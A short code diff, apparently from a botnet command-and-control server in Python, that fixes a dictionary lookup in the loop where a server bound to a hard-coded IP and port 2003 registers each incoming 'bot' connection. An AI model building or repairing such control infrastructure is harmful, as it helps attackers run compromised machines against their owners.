@@ -24,7 +24,7 @@ def start_server(port=2003,ip="142.93.197.240"):
     while True:
         bot,addr = s.accept()
         botnet[str(addr[0])] = bot
-        if(botnet.find(str(addr[0]))):
+        if(botnet.get(str(addr[0]))):
             print("[*] New bot %s"%(str(addr[0])))
 
 def detect_os():
